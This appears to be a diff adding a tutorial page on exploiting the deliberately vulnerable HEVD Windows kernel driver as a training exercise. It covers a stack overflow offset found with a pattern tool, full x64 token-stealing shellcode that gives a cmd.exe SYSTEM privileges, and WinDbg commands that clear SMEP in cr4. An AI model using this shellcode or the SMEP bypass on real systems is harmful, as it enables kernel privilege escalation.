@@ -1,0 +1,186 @@
+---
+title: '2: Exploiting the HEVD'
+---
+
+#<%= current_page.data.title %>
+
+**HEVD** is short for **[ HackSys Extreme Vulnerable Driver](https///github.com/hacksysteam/HackSysExtremeVulnerableDriver)**. It will be our easy (and not so easy) way into the kernel.
+
+It's a driver specifically programmed to be vulnerable to typical driver vulnerabilities. It hasn't been signed by Microsoft (I wonder why?) so in order to load it you have to either disable "Driver Signature Enforcement" via the Windows 10 special startup menu or attach a kernel debugger. The latter should be the obvious choice since it will also help us in debugging the driver and our exploit. Windows will still complain that the driver is unsigned but will load it anyway. Just try without the attached debugger and you will see the difference. 
+
+Get the *OSR driver loader* if you prefer a gui to load the driver or just use the command line:
+
+	:::bash
+	#register driver
+	sc create HEVD type= kernel start= demand error= normal DisplayName= HEVD binpath= c:\_test\HEVD.sys
+	#sc description HEVD HEVD
+	sc start HEVD
+	sc stop HEVD
+	# unregister driver:
+	sc delete HEVD
+
+
+
+
+
+
+## Exercise 1: Understanding DriverEntry
+
+
+	
+	Calling Conventions
+	Parameters: RCX, RDX, R8, R9, stack..
+	(Floating point parameters:  XMM0L, XMM1L, XMM2L und XMM3L)
+	volatile: RAX, R10, R11, XMM4 und XMM5
+	non-volatile: RBX, RBP, RDI, RSI, RSP, R12, R13, R14 und R15
+	return value: RAX
+	
+
+
+	
+	# Windbg
+	ed Kd_DEFAULT_Mask 8
+	
+
+
+## Stack Overflow
+
+Since the driver didn't return anything useful our second test will be to send a very large buffer to the driver and see what happens (   [https://stlt.de/doku.php?id=tutorials:winexp:hevd:source1](https///stlt.de/doku.php?id=tutorials/winexp/hevd/source1)). 
+
+[{{:tutorials:winexp:hevd:stack_41.png?direct&400|41 Everywhere!}}]
+
+## Pattern
+
+
+[https://github.com/Svenito/exploit-pattern/blob/master/pattern.py](https///github.com/Svenito/exploit-pattern/blob/master/pattern.py)
+
+	
+	python .\pattern.py "0x3771433671433571"
+	Pattern 0x3771433671433571 first occurrence at position 2056 in pattern.
+
+
+	
+	bp fffff801`98f05708
+
+
+## Shellcode
+
+We can now control the driver execution. Instead of returning from the function we can make the processor execute whatever we wish with ring 0 privileges. The main downside is that this *whatever we wish* has to be position independent code.
+
+`<spoiler|why?>`
+Normal windows executables and dll's are, I think the technical term is *Load-time locatable code*. They call library functions  relative to the library base address. The addresses where the functions actually are in memory are calculated when the program is loaded. Without ASLR (address space layout randomization) the library would be in the same place all the time, with ASLR its location is random. And ASLR has been implemented in every major OS for centuries (or at least since around Vista).
+
+`</spoiler>`
+
+Position independent code can be 'created' in basically two ways:
+ 1.  A very simple piece of code that doesn't require any library calls
+ 2.  A rather complicated piece of code that finds all relevant library addresses by itself 
+So of course we will chose option 1. This simple code is usually written in Assembler and it is called *Shellcode* because it's main 'historic' use was starting a shell. It still is in many cases (remote execution etc.) but in our case it isn't. We can start a *cmd.exe* from our user mode code but we need the shellcode to elevate the privileges of said cmd shell. This isn't strictly required since you probably opened a shell already. But it makes it easier to identify the correct cmd.exe to elevate. 
+
+So let's spawn a shell really quick and get its process identifier:
+
+	:::c
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	
+	ZeroMemory(&si, sizeof(STARTUPINFO));
+	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+	si.cb = sizeof(STARTUPINFOA);
+	
+	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+		printf("[Duh!]: Error creating cmd.exe\n");
+		return -1;
+	}
+	DWORD cmd_pid = pi.dwProcessId;
+
+
+`</spoiler>`
+
+The easiest shellcode solution to escalate the privileges of a windows process is borrowing a system token. It is pretty much the assembly version of the token stealing tutorial from [https://stlt.de/doku.php?id=tutorials:winkdbg:part4_processes](https///stlt.de/doku.php?id=tutorials/winkdbg/part4_processes).
+
+	:::asm
+	;NASM
+	bits 64 
+	section .text
+	global _start
+	
+	_start:
+		mov r9, [gs:0x188]  		; KPCR+KPCRB+KTHREAD
+		mov r9, [r9 + 0x220]		; _EPROCESS
+		mov r8, [r9 + 0x3e0]		; InheritedFromUniqueProcessId
+		mov rax, r9
+	loop1:
+		mov rax, [rax + 0x2f0]		; ActiveProcessLinks
+		sub rax, 0x2f0						
+		cmp [rax + 0x2e8], r8		; find Parent
+		jne loop1
+		mov rcx, rax
+		add rcx, 0x358				; Token address
+		mov rax, r9
+	loop2:
+		mov rax, [rax + 0x2f0]
+		sub rax, 0x2f0
+		cmp [rax + 0x2e8], dword 4
+		jne loop2
+		mov rdx, rax
+		add rdx, 0x358
+		mov rdx, [rdx]
+		mov [rcx], rdx 
+		ret
+	
+
+
+Compile and extract raw code
+
+	:::bash
+	nasm token1.asm -o token1.bin -f bin
+	# radare2 
+	radare2 -b 32 -c pc ./token1.bin
+	# or use HxD Hex editor: Edit -> Copy as -> C
+
+
+[{{:tutorials:winexp:hevd:hxd.png?400|Extracting binary shellcode with HxD.}}]
+
+## DEP
+
+
+	:::c
+	BOOL WINAPI VirtualProtect(
+	  _In_  LPVOID lpAddress,
+	  _In_  SIZE_T dwSize,
+	  _In_  DWORD  flNewProtect,
+	  _Out_ PDWORD lpflOldProtect
+	);
+
+
+## SMEP
+
+Smep, short for *Supervisor mode execution protection* is a processor feature to prevent code running in the kernel from executing code inside user space memory. It is meant to prevent what we are trying to do: putting shellcode somewhere into user space memory and tricking the kernel into executing it. To circumvent it we would have to either find a way to load the shellcode into a memory page executable by the kernel or we would have to disable SMEP. To keep things simple for now we will do neither. Virtualbox doesn't support SMEP anyway, and anyone using VMware workstation can just disable it via GOD-MODE windbg by clearing bis 20 in the cr4 control register:
+
+	:::bash
+	# Check if cr4 bit 20 is actually set:
+	r cr4
+	.formats cr4
+	? (@cr4 and (1 << 0n20))
+	# MASM doesn't have a bitwise not, so we'll use c to clear bit 20:
+	r cr4 = @@(@cr4 & ~(1<<20))
+
+
+## Windbg
+
+	:::c
+	.reload
+	x HEVD!*
+	# sometimes:
+	lm, lmv
+	
+	bp HEVD!TriggerStackOverflow
+	pt #go to return
+	u poi(rsp) -> shellcode
+	bp `<shellcode>`
+	
+	
+
+{{:tutorials:winexp:hevd:stackoverflow.png?direct&400|}}
+
+
